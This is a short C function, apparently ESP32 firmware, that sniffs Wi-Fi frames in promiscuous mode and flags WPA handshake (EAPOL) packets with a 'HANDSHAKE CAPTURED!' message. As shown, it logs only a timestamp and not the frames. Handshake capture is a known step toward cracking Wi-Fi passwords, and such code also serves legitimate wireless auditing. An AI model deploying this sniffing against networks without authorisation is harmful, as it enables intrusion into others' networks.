void handshakeSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    (void)type;
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    int len = pkt->rx_ctrl.sig_len;
    uint8_t* payload = pkt->payload;
    if (len < 30) return;
    for (int i = 0; i < len - 8; i++) {
        if (payload[i] == 0x88 && payload[i+1] == 0x8E) {
            handshakes += "[HANDSHAKE] " + String(millis()/1000) + "s\\n";
            saveData();
            showSuccess("HANDSHAKE CAPTURED!", "");
            return;
        }
    }
}

